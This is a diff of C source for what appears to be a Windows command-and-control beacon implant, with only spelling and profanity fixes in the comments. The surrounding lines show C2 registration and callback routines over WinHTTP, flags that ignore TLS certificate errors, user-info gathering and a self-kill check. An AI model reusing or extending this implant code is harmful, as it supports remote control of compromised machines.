@@ -13,7 +13,7 @@
 
 #ifdef WIN
 
-    // use our windows dpendencies
+    // use our windows dependencies
 
     #define WIN32_LEAN_AND_MEAN
     #include <windows.h>
@@ -35,7 +35,7 @@
 BOOL GetBasicUserInfo(struct BasicUserInfo *UserInfo)
 {
 
-    /* get basic infomation about how the current user is running */
+    /* get basic information about how the current user is running */
 
     #define INFO_BUFFER_SIZE 32767
 
@@ -117,7 +117,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
 
     if (!hSession)
     {
-        // not really alot we can do about this, guess we just return and try again later...
+        // not really a lot we can do about this, guess we just return and try again later
         return FALSE;
     }
 
@@ -127,7 +127,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
 
     if (!hConnect)
     {
-        // again, we cant do nothin so just go again later
+        // again, we cant do nothing so just go again later
         return FALSE;
     }
 
@@ -141,7 +141,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
         return FALSE;
     }
 
-    // set the flags for our request, basically so we can connect when the c2 ssl cert is fucked
+    // set the flags for our request, basically so we can connect when the c2 ssl cert is messed up
 
     // INTERNET_OPTION_HTTP_DECODING
 
@@ -149,7 +149,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     printf("four\n");
     if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
     {
-        // guess what...
+        // guess what
         return FALSE;
     }
 
@@ -160,7 +160,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     // make sure the request was successful
     if (bResults)
     {
-        printf("WinHttpSendRequest was success\n");       
+        printf("WinHttpSendRequest was success\n");
         bResults = WinHttpReceiveResponse(hRequest, NULL);
     } else {
         if (GetLastError() & ERROR_WINHTTP_SECURE_FAILURE)
@@ -182,7 +182,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
             
             if (!WinHttpQueryDataAvailable( hRequest, &dwSize))
             {
-                // Theres no data avalible
+                // Theres no data available
                 printf("WinHttpQueryDataAvailable error\n");
                 return FALSE;
             }
@@ -201,7 +201,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     }
     printf("after loops\n");
     
-    // clean up the buffer so its parseable
+    // clean up the buffer so its parsable
 
     // ReadBuffer[57] = '\0';
 
@@ -211,7 +211,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
 
-    // now its time to parse the json data in the responce
+    // now its time to parse the json data in the response
     printf("six\n");
     parsed_json = json_tokener_parse(ReadBuffer);
     printf("seven\n");
@@ -224,7 +224,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
 
     printf("ID: %s\n", IdBuffer);
 
-    // now check we dont need to kill ourselves
+    // now check we don't need to kill ourselves
     CheckIfDie(&ReadBuffer);
 
     return TRUE;
@@ -249,7 +249,7 @@ LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
     {
     case MODE_CHECKIN_NO_DATA:
     
-        // dont add any data  
+        // don't add any data
         break;
     
     case MODE_CHECKIN_DATA:
@@ -264,7 +264,7 @@ LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
         break;
     }
 
-    // return the formated data
+    // return the formatted data
     return (LPCSTR*)json_object_to_json_string_ext(jobj, JSON_C_TO_STRING_PLAIN);
 }
 
@@ -298,7 +298,7 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
 
     if (!hSession)
     {
-        // not really alot we can do about this, guess we just return and try again later...
+        // not really a lot we can do about this, guess we just return and try again later
         return FALSE;
     }
 
@@ -308,7 +308,7 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
 
     if (!hConnect)
     {
-        // again, we cant do nothin so just go again later
+        // again, we can't do nothing so just go again later
         return FALSE;
     }
 
@@ -322,13 +322,13 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
         return FALSE;
     }
 
-    // set the flags for our request, basically so we can connect when the c2 ssl cert is fucked
+    // set the flags for our request, basically so we can connect when the c2 ssl cert is messed up
 
     flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
     if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
     {
-        // guess what...
+        // guess what
         return FALSE;
     }
 
